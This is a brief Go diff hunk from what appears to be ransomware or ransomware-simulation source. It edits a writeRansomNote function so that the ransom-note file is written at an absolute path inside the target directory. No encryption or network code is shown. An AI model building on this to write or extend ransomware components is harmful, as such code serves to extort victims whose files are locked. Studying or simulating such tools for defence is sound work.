@@ -501,7 +501,7 @@ func removeFileArtifacts(rootDir string) {
 }
 
 func writeRansomNote(rootDir string, text string) {
-	ransomNoteFile := path.Join(rootDir, RANSOM_NOTE_FILE)
+	ransomNoteFile, _ := filepath.Abs(path.Join(rootDir, RANSOM_NOTE_FILE))
 	fmt.Printf("[*] Writing ransom note file: %s\n", ransomNoteFile)
     finalnote := fmt.Sprintf(text, rootDir)
 	ioutil.WriteFile(ransomNoteFile, []byte(finalnote), 0644)
